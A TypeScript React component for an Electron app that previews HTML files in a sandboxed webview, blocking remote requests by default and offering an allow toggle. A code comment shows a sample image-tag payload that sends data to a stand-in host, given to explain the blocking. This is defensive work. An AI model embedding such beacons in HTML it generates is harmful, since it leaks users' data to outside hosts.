import { useEffect, useMemo, useRef, useState } from 'react';
import { ShieldAlert, Globe } from 'lucide-react';
import { cn } from '@/lib/utils';

type Props = {
  filePath: string;
  // Test seam. Browsers refuse to frame file:// from an http page, so the
  // harness swaps in an http URL for the same bytes. Production leaves it
  // unset and renders straight off disk.
  resolveSrc?: (path: string) => string;
};

type PreviewApi = {
  htmlPreviewPartition?: string;
  setHtmlPreviewAllowRemote?: (webContentsId: number, allow: boolean) => Promise<boolean>;
  onHtmlPreviewBlocked?: (cb: (info: { url: string; webContentsId: number }) => void) => () => void;
};

type PreviewWebview = HTMLElement & {
  getWebContentsId: () => number;
  reload: () => void;
};

function fileUrl(path: string): string {
  return 'file://' + path.split('/').map(encodeURIComponent).join('/');
}

// Rendered HTML, not source. Loaded from file:// rather than srcdoc so relative
// stylesheets and images resolve the way they do on disk.
//
// Remote loads are blocked by default. HTML written by an agent is untrusted:
// <img src="https://x/?d=..."> in a generated file turns a preview into an
// exfiltration channel. Same posture an email client takes to remote images.
export function HtmlViewer({ filePath, resolveSrc }: Props) {
  const api = (window as unknown as { electronAPI?: PreviewApi }).electronAPI;
  const partition = api?.htmlPreviewPartition;
  const [blocked, setBlocked] = useState<string[]>([]);
  const [allowRemote, setAllowRemote] = useState(false);
  const hostRef = useRef<HTMLDivElement>(null);
  const webviewRef = useRef<PreviewWebview | null>(null);
  const url = useMemo(() => (resolveSrc ? resolveSrc(filePath) : fileUrl(filePath)), [filePath, resolveSrc]);

  useEffect(() => {
    if (!api?.onHtmlPreviewBlocked) return;
    return api.onHtmlPreviewBlocked(({ url: blockedUrl, webContentsId }) => {
      if (webviewRef.current?.getWebContentsId() !== webContentsId) return;
      setBlocked(prev => (prev.includes(blockedUrl) ? prev : [...prev, blockedUrl]));
    });
  }, [api]);

  useEffect(() => {
    setBlocked([]);
    setAllowRemote(false);
  }, [filePath]);

  // <webview> is not a React element, and it has to carry the partition so the
  // main process can scope request blocking to previews alone.
  useEffect(() => {
    const host = hostRef.current;
    if (!host || !partition) return;
    host.innerHTML = '';
    const view = document.createElement('webview') as PreviewWebview;
    webviewRef.current = view;
    view.setAttribute('src', url);
    view.setAttribute('partition', partition);
    view.setAttribute('webpreferences', 'contextIsolation=yes,nodeIntegration=no,sandbox=yes,javascript=no');
    view.style.width = '100%';
    view.style.height = '100%';
    view.style.border = '0';
    host.appendChild(view);
    return () => {
      const webContentsId = view.getWebContentsId();
      if (webContentsId) void api?.setHtmlPreviewAllowRemote?.(webContentsId, false);
      webviewRef.current = null;
      host.innerHTML = '';
    };
  }, [api, url, partition]);

  const toggleRemote = async () => {
    const view = webviewRef.current;
    if (!view) return;
    const next = !allowRemote;
    const applied = await api?.setHtmlPreviewAllowRemote?.(view.getWebContentsId(), next);
    if (applied !== next) return;
    setBlocked([]);
    setAllowRemote(applied);
    view.reload();
  };

  return (
    <div className="flex flex-col h-full min-h-0 bg-white">
      {(blocked.length > 0 || allowRemote) && (
        <div className={cn(
          'flex items-center gap-2 px-3 py-1.5 border-b shrink-0 text-[10px]',
          allowRemote ? 'bg-warning/10 border-warning/40 text-warning' : 'bg-secondary border-border text-muted-foreground',
        )}>
          {allowRemote ? <Globe className="w-3 h-3 shrink-0" /> : <ShieldAlert className="w-3 h-3 shrink-0" />}
          <span className="flex-1 truncate">
            {allowRemote
              ? 'Remote content allowed for this preview'
              : `Blocked ${blocked.length} remote request${blocked.length === 1 ? '' : 's'}`}
          </span>
          <button
            className="px-1.5 py-0.5 rounded hover:bg-background/60 transition-colors shrink-0"
            onClick={toggleRemote}
          >
            {allowRemote ? 'Block again' : 'Allow'}
          </button>
        </div>
      )}
      {partition ? (
        <div ref={hostRef} className="flex-1 min-h-0" />
      ) : (
        // Outside Electron (tests, harness) there is no session to scope
        // blocking to, so fall back to a fully sandboxed iframe.
        <iframe
          title="preview"
          src={url}
          sandbox=""
          className="flex-1 min-h-0 w-full border-0 bg-white"
        />
      )}
    </div>
  );
}
